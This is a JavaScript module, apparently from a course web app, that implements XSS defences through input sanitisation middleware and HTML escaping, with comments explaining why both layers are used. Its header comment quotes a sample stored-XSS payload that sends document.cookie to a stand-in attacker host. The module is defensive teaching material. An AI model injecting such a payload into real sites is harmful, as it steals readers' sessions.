/**
 * XSS defence — stripping dangerous markup before anything is stored.
 *
 * The attack, from the lecture: a user types
 *
 *     <script>fetch("http://attacker.com/steal?cookie=" + document.cookie)</script>
 *
 * into a post. If that string is stored as-is and later rendered as HTML, it
 * runs in the browser of every single person who views the page — stored XSS,
 * one attack affecting every reader.
 *
 * There are two defences and this app uses both, because they fail in
 * different places:
 *
 *   SANITISE ON THE WAY IN  (this file)
 *       The stored value is plain text. Even if some future part of the app
 *       renders it carelessly, there is nothing dangerous left to render.
 *
 *   ESCAPE ON THE WAY OUT   (React does this for us)
 *       React escapes everything inside {curly braces} automatically, so
 *       `<script>` arrives in the page as visible text. This is why the app
 *       contains no `dangerouslySetInnerHTML` anywhere — that prop is React's
 *       innerHTML, and it opts out of the protection.
 *
 * Doing only one of the two is a single point of failure. Doing both means a
 * mistake in either place is not enough on its own to create a hole.
 */

import sanitizeHtml from 'sanitize-html'

/**
 * Strips every tag and attribute, leaving the text content.
 *
 *   '<script>alert("Hacked")</script>Nice ride!'  ->  'Nice ride!'
 *   '<b>Hello</b>'                                ->  'Hello'
 *
 * We allow no tags at all. User posts in this app are prose, not markup, and
 * React escapes on output anyway — so storing plain text means the stored
 * value can never be ambiguous. If rich text were ever wanted, this is the
 * one place to add an allowlist, for example:
 *
 *   sanitizeHtml(value, { allowedTags: ['b', 'i', 'em', 'strong'], allowedAttributes: {} })
 */
export function cleanText(value) {
  if (typeof value !== 'string') return value

  return sanitizeHtml(value, {
    allowedTags: [],
    allowedAttributes: {},
    // Without this, sanitize-html leaves the text of a <script> behind.
    nonTextTags: ['style', 'script', 'textarea', 'option', 'noscript'],
  }).trim()
}

/**
 * Middleware: cleans the named fields of req.body in place, so controllers
 * and models only ever see text that is already safe.
 *
 *   router.post('/', sanitizeBody('body'), validate({...}), controller)
 *
 * Sanitising BEFORE validating matters: it means length limits are measured
 * on what will actually be stored, so someone cannot slip a 1200-character
 * post past a 1000-character limit by padding it with markup that is about
 * to be stripped.
 */
export function sanitizeBody(...fields) {
  return function sanitizeRequest(req, _res, next) {
    if (req.body && typeof req.body === 'object') {
      for (const field of fields) {
        if (typeof req.body[field] === 'string') {
          req.body[field] = cleanText(req.body[field])
        }
      }
    }
    next()
  }
}

/**
 * Escapes the five characters that have meaning in HTML.
 *
 * Used when the SERVER itself builds HTML — the lecture's example was an
 * Express route echoing a search term straight into a page:
 *
 *   /search?q=<script>alert(1)</script>
 *   ->  <h1>Results for: &lt;script&gt;alert(1)&lt;/script&gt;</h1>
 *
 * React handles this for every value the client renders, so inside this app
 * it is only needed where we generate markup ourselves, such as the
 * verification emails.
 */
export function escapeHtml(value) {
  return String(value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;')
}
